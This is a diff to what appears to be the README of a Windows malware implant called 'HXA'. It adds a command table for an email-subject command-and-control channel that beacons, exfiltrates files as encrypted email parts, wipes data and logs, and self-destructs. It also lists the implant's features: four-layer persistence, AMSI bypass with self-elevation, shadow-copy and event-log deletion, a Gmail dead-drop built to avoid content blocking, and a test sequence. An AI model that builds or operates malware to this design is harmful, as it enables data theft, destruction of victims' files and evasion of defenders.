@@ -31,4 +31,23 @@ registry traces.
 
 ---
 
-## 🔄 How It Works
+C2 Command Reference (send an email to yourself, subject = command)
+
+
+Email Subject	Action
+HXA:BEACON	Send recon/status beacon email
+HXA:EXFIL	Collect all files < 5 MB → AES encrypt → email parts
+HXA:WIPE	Delete files → overwrite with 0101... → registry wipe → shadows → logs → dialog
+HXA:PERSIST	Reinstall all 4 persistence layers
+HXA:CLEAN	Remove persistence (implant keeps running)
+HXA:SLEEP:60	Set beacon interval to 60 min
+HXA:SELFDESTRUCT	Remove persistence + delete implant files + exit
+Key APT behaviors added
+Kill chain sequencing — every phase is logged with its phase number
+4-layer persistence — Run key, hidden scheduled task, WMI event subscription, Startup launcher. Removing any one still leaves the others
+State file — after the first successful mission, reboots only re-beacon; no destructive re-run
+AMSI bypass + self-elevation — exploits common weak points in the environment
+Anti-forensics — deletes shadow copies (vssadmin), clears event logs (wevtutil), wipes RecentDocs MRU
+C2 dead-drop — commands arrive as email subjects (plain ASCII, no attachments = no Gmail content block); beacons use jittered intervals (50–150% of base)
+Stealth toggle — $ConsoleOutput = $false silences all console output for silent persistence runs
+Test sequence: edit the 3 credentials → run once → confirm parts arrive in Gmail → confirm wipe + dialog → reboot → confirm the implant beacons back (check for HXA:BEACON email) → send HXA:CLEAN or HXA:SELFDESTRUCT to tear it down.
